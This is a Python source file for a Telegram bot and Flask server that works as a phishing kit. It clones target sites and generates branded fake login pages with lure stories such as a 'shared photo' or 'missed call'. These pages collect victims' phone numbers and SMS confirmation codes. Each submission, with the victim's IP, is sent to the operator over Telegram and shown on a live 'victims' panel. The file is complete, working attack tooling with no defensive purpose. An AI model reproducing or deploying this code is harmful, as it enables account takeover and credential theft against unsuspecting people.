import telebot
import requests
from bs4 import BeautifulSoup
import os
import shutil
from urllib.parse import urljoin, urlparse
import zipfile
import threading
import time
import json
import re
import hashlib
from flask import Flask, request, render_template_string, jsonify
import random

# ========== КОНФИГ ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', 0))
ALLOWED_USERS = [ADMIN_ID]
ACTIVE_TASKS = {}
PHISH_SITES = {}

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

def get_server_url():
    """Безопасное получение URL сервера"""
    railway_domain = os.environ.get('RAILWAY_PUBLIC_DOMAIN')
    if railway_domain:
        return f"https://{railway_domain}"
    for var in ['RENDER_EXTERNAL_URL', 'HEROKU_APP_URL']:
        val = os.environ.get(var)
        if val:
            return val if val.startswith('http') else f"https://{val}"
    return os.environ.get('SERVER_URL', 'http://localhost:5000')

# ========== ПАНЕЛЬ ЛОГОВ ==========
PANEL_HTML = '''
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Панель | {{ domain }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
        h1 { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; font-size: 20px; }
        .stats { display: flex; gap: 20px; margin-bottom: 20px; }
        .stat { background: #111; padding: 15px; border-radius: 8px; text-align: center; flex: 1; }
        .stat .num { font-size: 32px; color: #f00; }
        .log { background: #111; border: 1px solid #333; padding: 10px; margin: 10px 0; border-radius: 5px; }
        .log:hover { border-color: #0f0; }
        .key { color: #ff0; }
        .val { color: #0ff; word-break: break-all; }
        .time { color: #666; font-size: 11px; margin-top: 5px; }
        .empty { text-align: center; color: #666; padding: 50px; }
    </style>
    <script>setInterval(()=>location.reload(),5000);</script>
</head>
<body>
    <h1>🎣 ПАНЕЛЬ | {{ domain }}</h1>
    <div class="stats">
        <div class="stat"><div class="num">{{ logs|length }}</div>жертв</div>
        <div class="stat"><div class="num">{{ ips|length }}</div>уникальных IP</div>
    </div>
    {% if logs %}
        {% for log in logs|reverse %}
        <div class="log">
            {% for k, v in log.items() %}
            {% if k not in ['user_agent', 'referer'] %}
            <span class="key">{{ k }}:</span> <span class="val">{{ v }}</span><br>
            {% endif %}
            {% endfor %}
            <div class="time">{{ log.get('time', '') }} | IP: {{ log.get('ip', '?') }}</div>
        </div>
        {% endfor %}
    {% else %}
    <div class="empty">⏳ Ожидание жертв...</div>
    {% endif %}
</body>
</html>
'''

@app.route('/panel/<phish_id>')
def view_panel(phish_id):
    phish = PHISH_SITES.get(phish_id)
    if not phish:
        return "Не найдено", 404
    return render_template_string(
        PANEL_HTML,
        domain=phish.get('domain', '?'),
        logs=phish.get('logs', []),
        ips=list(set(l.get('ip','?') for l in phish.get('logs', [])))
    )

@app.route('/submit/<phish_id>', methods=['POST'])
def submit_data(phish_id):
    phish = PHISH_SITES.get(phish_id)
    if not phish:
        return jsonify({'error': 'not found'}), 404
    
    data = {k: v for k, v in request.form.items()}
    data['ip'] = request.remote_addr
    data['user_agent'] = request.headers.get('User-Agent', '?')
    data['time'] = time.strftime('%Y-%m-%d %H:%M:%S')
    
    phish.setdefault('logs', []).append(data)
    
    try:
        text = f"🔥 НОВАЯ ЖЕРТВА | {phish.get('domain','?')}\n\n"
        for k, v in data.items():
            if k != 'user_agent':
                text += f"<b>{k}</b>: <code>{v}</code>\n"
        bot.send_message(ADMIN_ID, text, parse_mode='HTML')
    except:
        pass
    
    redirect_url = phish.get('redirect', 'https://google.com')
    return f'<script>window.location.href="{redirect_url}";</script>'

# ========== БАЗОВЫЙ КЛОНЕР ==========
class SiteCloner:
    def __init__(self, target_url, task_id, chat_id):
        self.target_url = target_url.rstrip('/')
        self.task_id = task_id
        self.chat_id = chat_id
        self.output_dir = f"/tmp/clones/{task_id}"
        self.domain = urlparse(target_url).netloc
        self.assets = 0
        
        os.makedirs(self.output_dir, exist_ok=True)
        for f in ['css', 'js', 'img', 'fonts']:
            os.makedirs(f"{self.output_dir}/{f}", exist_ok=True)
        
        self.session = requests.Session()
    
    def download(self, url, folder):
        try:
            if not url or url.startswith(('data:', 'blob:', '#')):
                return None
            if not url.startswith('http'):
                url = urljoin(self.target_url, url)
            
            name = os.path.basename(urlparse(url).path.split('?')[0])
            if not name or len(name) < 3:
                name = f"f_{hash(url)%10000}"
            if '.' not in name:
                name += '.css' if 'css' in url else '.js' if 'js' in url else '.png'
            
            path = f"{self.output_dir}/{folder}/{name}"
            r = self.session.get(url, headers={'User-Agent': 'Mozilla/5.0'}, timeout=15)
            if r.status_code == 200 and len(r.content) > 50:
                with open(path, 'wb') as f:
                    f.write(r.content)
                self.assets += 1
                return f"{folder}/{name}"
        except:
            pass
        return None
    
    def clone(self):
        bot.send_message(self.chat_id, f"🔄 Клонирую {self.domain}...")
        
        r = self.session.get(self.target_url, headers={
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
        }, allow_redirects=True, timeout=20)
        
        if r.status_code != 200:
            return None
        
        soup = BeautifulSoup(r.text, 'html.parser')
        
        for t in soup.find_all('link', href=True):
            if '.css' in t['href']:
                l = self.download(t['href'], 'css')
                if l: t['href'] = l
        
        for t in soup.find_all('script', src=True):
            l = self.download(t['src'], 'js')
            if l: t['src'] = l
        
        for t in soup.find_all('img', src=True):
            l = self.download(t['src'], 'img')
            if l: t['src'] = l
        
        with open(f'{self.output_dir}/index.html', 'w', encoding='utf-8') as f:
            f.write('<!DOCTYPE html>\n<html>\n<head>\n')
            f.write('<meta charset="UTF-8">\n')
            f.write('<meta name="viewport" content="width=device-width, initial-scale=1.0">\n')
            f.write(f'<title>{self.domain}</title>\n')
            for t in soup.find_all('link', href=True):
                f.write(str(t) + '\n')
            f.write('</head>\n<body>\n')
            f.write(str(soup.find('body') or soup))
            f.write('\n</body>\n</html>')
        
        return {'dir': self.output_dir, 'assets': self.assets}

# ========== PHANTOM BUILDER ==========
class PhantomBuilder:
    STORIES = {
        'photo': {'title': 'Кто-то поделился с вами фото', 'body': 'Войдите в аккаунт, чтобы посмотреть изображение.', 'button': 'Продолжить'},
        'message': {'title': 'Новое сообщение', 'body': 'У вас непрочитанное сообщение. Авторизуйтесь для просмотра.', 'button': 'Открыть'},
        'voice': {'title': 'Пропущенный звонок', 'body': 'У вас пропущенный голосовой вызов. Войдите чтобы прослушать.', 'button': 'Прослушать'},
    }
    
    def __init__(self, target_url, task_id, chat_id):
        self.target_url = target_url.rstrip('/')
        self.task_id = task_id
        self.chat_id = chat_id
        self.phish_id = hashlib.md5(task_id.encode()).hexdigest()[:12]
        self.output_dir = f"/tmp/phantom/{self.phish_id}"
        self.domain = urlparse(target_url).netloc
        
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(f"{self.output_dir}/assets", exist_ok=True)
        
        self.session = requests.Session()
    
    def fetch_brand(self):
        try:
            r = self.session.get(self.target_url, headers={
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)'
            }, timeout=15)
            
            soup = BeautifulSoup(r.text, 'html.parser')
            
            logo = None
            for img in soup.find_all('img'):
                src = img.get('src','')
                alt = img.get('alt','').lower()
                if 'logo' in src.lower() or 'logo' in alt or 'icon' in src.lower():
                    logo = img.get('src')
                    break
            
            title = soup.find('title')
            brand = title.text.split('|')[0].split('–')[0].strip()[:30] if title else self.domain
            
            primary = '#007aff'
            for style in soup.find_all('style'):
                if style.string:
                    colors = re.findall(r'(#[0-9a-fA-F]{6})', style.string)
                    if colors:
                        primary = colors[0]
                        break
            
            return {'brand': brand, 'logo': logo, 'primary': primary, 'domain': self.domain}
        except:
            return {'brand': self.domain.upper(), 'logo': None, 'primary': '#007aff', 'domain': self.domain}
    
    def build(self):
        bot.send_message(self.chat_id, f"👻 Создаю лендинг для {self.domain}...")
        
        brand = self.fetch_brand()
        story = self.STORIES['photo'] if any(x in self.domain for x in ['max','vk','tg']) else self.STORIES['message']
        
        local_logo = None
        if brand['logo']:
            try:
                logo_url = urljoin(self.target_url, brand['logo'])
                r = self.session.get(logo_url, timeout=10)
                if r.status_code == 200:
                    ext = os.path.splitext(urlparse(logo_url).path)[1] or '.png'
                    with open(f"{self.output_dir}/assets/logo{ext}", 'wb') as f:
                        f.write(r.content)
                    local_logo = f"assets/logo{ext}"
            except:
                pass
        
        primary = brand['primary']
        
        html = f'''<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{brand['brand']}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            background: #f5f5f5;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }}
        .container {{ max-width: 380px; width: 100%; text-align: center; }}
        .logo {{ font-size: 24px; font-weight: 700; color: #000; margin-bottom: 30px; }}
        .logo img {{ height: 40px; }}
        .card {{
            background: #fff;
            border-radius: 16px;
            padding: 30px 20px;
            box-shadow: 0 2px 20px rgba(0,0,0,0.08);
            margin-bottom: 20px;
        }}
        .icon {{
            width: 60px; height: 60px;
            background: {primary};
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin: 0 auto 20px;
            font-size: 28px;
        }}
        .story-title {{ font-size: 18px; font-weight: 600; color: #000; margin-bottom: 10px; }}
        .story-body {{ font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.5; }}
        .input-group {{ margin-bottom: 15px; text-align: left; }}
        .input-group label {{ display: block; font-size: 13px; color: #888; margin-bottom: 5px; }}
        .input-group input {{
            width: 100%; padding: 14px 16px;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            background: #f8f8f8;
            transition: border-color 0.2s;
        }}
        .input-group input:focus {{ outline: none; border-color: {primary}; background: #fff; }}
        .phone-prefix {{ display: flex; gap: 8px; }}
        .phone-prefix select {{
            padding: 14px 12px;
            border: 1.5px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            background: #f8f8f8;
            min-width: 80px;
        }}
        .phone-prefix input {{ flex: 1; }}
        .btn {{
            width: 100%; padding: 15px;
            background: {primary};
            color: white; border: none;
            border-radius: 12px;
            font-size: 17px; font-weight: 600;
            cursor: pointer; margin-top: 5px;
            transition: opacity 0.2s;
        }}
        .btn:hover {{ opacity: 0.9; }}
        .btn:active {{ opacity: 0.7; }}
        .footer {{ font-size: 12px; color: #999; text-align: center; margin-top: 20px; line-height: 1.6; }}
        .footer a {{ color: {primary}; text-decoration: none; }}
        .error {{ background: #fff0f0; color: #d00; padding: 12px; border-radius: 10px; font-size: 13px; margin-bottom: 15px; text-align: center; display: none; }}
        .loading {{ display: none; text-align: center; color: #888; font-size: 14px; margin: 15px 0; }}
        .spinner {{
            display: inline-block; width: 20px; height: 20px;
            border: 2px solid #ddd; border-top-color: {primary};
            border-radius: 50%; animation: spin 0.8s linear infinite;
            margin-right: 8px; vertical-align: middle;
        }}
        @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            {"<img src=\"" + local_logo + "\" alt=\"" + brand["brand"] + "\">" if local_logo else brand["brand"]}
        </div>
        <div class="card">
            <div class="icon">📩</div>
            <div class="story-title">{story['title']}</div>
            <div class="story-body">{story['body']}</div>
            <div class="error" id="error"></div>
            <form id="loginForm">
                <div class="input-group">
                    <label>Номер телефона</label>
                    <div class="phone-prefix">
                        <select name="country_code">
                            <option value="+7">🇷🇺 +7</option>
                            <option value="+375">🇧🇾 +375</option>
                            <option value="+380">🇺🇦 +380</option>
                            <option value="+998">🇺🇿 +998</option>
                        </select>
                        <input type="tel" name="phone" placeholder="(999) 123-45-67" required autofocus>
                    </div>
                </div>
                <div class="input-group" id="codeGroup" style="display:none;">
                    <label>Код подтверждения</label>
                    <input type="text" name="code" placeholder="Введите код из SMS" maxlength="6" inputmode="numeric">
                </div>
                <button type="submit" class="btn" id="submitBtn">{story['button']}</button>
            </form>
            <div class="loading" id="loading">
                <div class="spinner"></div> Проверка...
            </div>
        </div>
        <div class="footer">
            Нажимая кнопку, вы соглашаетесь с<br>
            <a href="#">условиями использования</a> и 
            <a href="#">политикой конфиденциальности</a>.
        </div>
    </div>
    <script>
        const form = document.getElementById('loginForm');
        const phoneInput = form.querySelector('[name="phone"]');
        const codeGroup = document.getElementById('codeGroup');
        const codeInput = form.querySelector('[name="code"]');
        const submitBtn = document.getElementById('submitBtn');
        const errorDiv = document.getElementById('error');
        const loading = document.getElementById('loading');
        let step = 1;
        
        phoneInput.addEventListener('input', (e) => {{
            let val = e.target.value.replace(/[^0-9]/g, '');
            if (val.length > 10) val = val.slice(0, 10);
            if (val.length > 0) val = '(' + val.slice(0,3) + ') ' + val.slice(3,6) + '-' + val.slice(6,10);
            e.target.value = val;
        }});
        
        form.addEventListener('submit', async (e) => {{
            e.preventDefault();
            if (step === 1) {{
                const phone = phoneInput.value.replace(/[^0-9]/g, '');
                if (phone.length < 10) {{ showError('Введите полный номер'); return; }}
                await fetch('/submit/{self.phish_id}', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
                    body: new URLSearchParams({{phone, step: 1}})
                }});
                codeGroup.style.display = 'block';
                submitBtn.textContent = 'Подтвердить';
                codeInput.focus();
                step = 2;
            }} else {{
                const code = codeInput.value.trim();
                if (code.length < 4) {{ showError('Введите код полностью'); return; }}
                loading.style.display = 'block';
                submitBtn.disabled = true;
                await fetch('/submit/{self.phish_id}', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
                    body: new URLSearchParams({{phone: phoneInput.value.replace(/[^0-9]/g,''), code, step: 2}})
                }});
                setTimeout(() => window.location.href = '{self.target_url}', 3000);
            }}
        }});
        
        function showError(msg) {{
            errorDiv.textContent = msg;
            errorDiv.style.display = 'block';
            setTimeout(() => errorDiv.style.display = 'none', 3000);
        }}
    </script>
</body>
</html>'''
        
        with open(f'{self.output_dir}/index.html', 'w', encoding='utf-8') as f:
            f.write(html)
        
        PHISH_SITES[self.phish_id] = {
            'url': self.target_url,
            'domain': self.domain,
            'redirect': self.target_url,
            'logs': [],
            'type': 'phantom'
        }
        
        return {'phish_id': self.phish_id, 'brand': brand, 'dir': self.output_dir}

# ========== КОМАНДЫ ==========
@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id not in ALLOWED_USERS:
        return
    bot.reply_to(message, """
🚀 БОТ v5.1

📥 /clone URL — точная копия сайта
👻 /phantom URL — фишинг-лендинг с историей
📊 /panel ID — панель логов
📋 /logs ID — логи жертв
📋 /list — список сайтов
💾 /get ID — скачать ZIP
""")

@bot.message_handler(commands=['clone'])
def clone_cmd(message):
    if message.from_user.id not in ALLOWED_USERS: return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ /clone https://site.com")
        return
    url = args[1]
    if not url.startswith('http'): url = 'https://' + url
    
    tid = str(int(time.time()))[-8:]
    ACTIVE_TASKS[tid] = {'url': url, 'status': 'cloning', 'chat_id': message.chat.id, 'type': 'clone'}
    msg = bot.reply_to(message, f"📥 Клонирую {url}...")
    
    def process():
        cloner = SiteCloner(url, tid, message.chat.id)
        result = cloner.clone()
        if result:
            zip_path = f"/tmp/clones/{tid}.zip"
            shutil.make_archive(f"/tmp/clones/{tid}", 'zip', result['dir'])
            ACTIVE_TASKS[tid].update({'status': 'done', 'file': zip_path, 'assets': result['assets']})
            bot.edit_message_text(f"✅ Готово!\n📎 Ресурсов: {result['assets']}\n💾 /get {tid}", message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ Ошибка", message.chat.id, msg.message_id)
    
    threading.Thread(target=process).start()

@bot.message_handler(commands=['phantom'])
def phantom_cmd(message):
    if message.from_user.id not in ALLOWED_USERS: return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ /phantom https://site.com")
        return
    url = args[1]
    if not url.startswith('http'): url = 'https://' + url
    
    tid = str(int(time.time()))[-8:]
    ACTIVE_TASKS[tid] = {'url': url, 'status': 'building', 'chat_id': message.chat.id, 'type': 'phantom'}
    msg = bot.reply_to(message, f"👻 Создаю лендинг...\n🎯 {url}")
    
    def process():
        builder = PhantomBuilder(url, tid, message.chat.id)
        result = builder.build()
        if result:
            server_url = get_server_url()
            phish_url = f"{server_url}/phantom/{result['phish_id']}"
            panel_url = f"{server_url}/panel/{result['phish_id']}"
            zip_path = f"/tmp/phantom/{result['phish_id']}.zip"
            shutil.make_archive(f"/tmp/phantom/{result['phish_id']}", 'zip', result['dir'])
            
            ACTIVE_TASKS[tid].update({
                'status': 'done', 'phish_id': result['phish_id'],
                'file': zip_path, 'panel_url': panel_url
            })
            
            text = f"""
✅ ГОТОВО!

🔑 ID: <code>{result['phish_id']}</code>
🎯 {url}

👻 ЖЕРТВЕ:
<code>{phish_url}</code>

📊 ЛОГИ:
<code>{panel_url}</code>

📋 /logs {result['phish_id']}
💾 /get {tid}
"""
            bot.edit_message_text(text, message.chat.id, msg.message_id, parse_mode='HTML')
        else:
            bot.edit_message_text("❌ Ошибка", message.chat.id, msg.message_id)
    
    threading.Thread(target=process).start()

@bot.message_handler(commands=['get'])
def get_cmd(message):
    if message.from_user.id not in ALLOWED_USERS: return
    args = message.text.split()
    if len(args) < 2: return
    tid = args[1]
    task = ACTIVE_TASKS.get(tid)
    if not task or task.get('status') != 'done':
        bot.reply_to(message, "❌ Не готово")
        return
    path = task.get('file')
    if not path or not os.path.exists(path):
        bot.reply_to(message, "❌ Файл не найден")
        return
    with open(path, 'rb') as f:
        bot.send_document(message.chat.id, f, visible_file_name=f"{task.get('type','file')}_{tid}.zip")

@bot.message_handler(commands=['list'])
def list_cmd(message):
    if message.from_user.id not in ALLOWED_USERS: return
    text = "📊 АКТИВНЫЕ:\n\n"
    if PHISH_SITES:
        for pid, p in PHISH_SITES.items():
            text += f"🔑 {pid} | {p.get('type','?')}\n🎯 {p.get('domain','?')}\n👥 Жертв: {len(p.get('logs',[]))}\n📊 /panel {pid}\n\n"
    else:
        text += "Нет активных\n"
    done = {k:v for k,v in ACTIVE_TASKS.items() if v.get('status')=='done'}
    text += f"\n📦 Готовых клонов: {len(done)}\n/get ID для скачивания"
    bot.reply_to(message, text)

@bot.message_handler(commands=['panel'])
def panel_cmd(message):
    if message.from_user.id not in ALLOWED_USERS: return
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ /panel ID")
        return
    bot.reply_to(message, f"📊 {get_server_url()}/panel/{args[1]}")

@bot.message_handler(commands=['logs'])
def logs_cmd(message):
    if message.from_user.id not in ALLOWED_USERS: return
    args = message.text.split()
    if len(args) < 2: return
    phish = PHISH_SITES.get(args[1])
    if not phish or not phish.get('logs'):
        bot.reply_to(message, "📭 Нет логов")
        return
    for log in phish['logs'][-5:]:
        text = "🔥 ЖЕРТВА:\n"
        for k, v in log.items():
            if k not in ['user_agent']:
                text += f"<b>{k}</b>: <code>{v}</code>\n"
        bot.send_message(message.chat.id, text, parse_mode='HTML')

# ========== ОТДАЧА СТРАНИЦ ==========
@app.route('/phantom/<phish_id>')
def serve_phantom(phish_id):
    path = f'/tmp/phantom/{phish_id}/index.html'
    if os.path.exists(path):
        return open(path, 'r', encoding='utf-8').read()
    return "Не найдено", 404

@app.route('/phantom/<phish_id>/<path:filename>')
def serve_phantom_assets(phish_id, filename):
    path = f'/tmp/phantom/{phish_id}/{filename}'
    if os.path.exists(path):
        mime = 'text/css' if filename.endswith('.css') else 'application/javascript'
        return open(path, 'rb').read(), 200, {'Content-Type': mime}
    return "Not found", 404

@app.route('/')
def home():
    return "Running", 200

# ========== ЗАПУСК ==========
if __name__ == '__main__':
    print("🚀 v5.1 FIX запущен!")
    os.makedirs('/tmp/clones', exist_ok=True)
    os.makedirs('/tmp/phantom', exist_ok=True)
    threading.Thread(target=bot.infinity_polling).start()
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
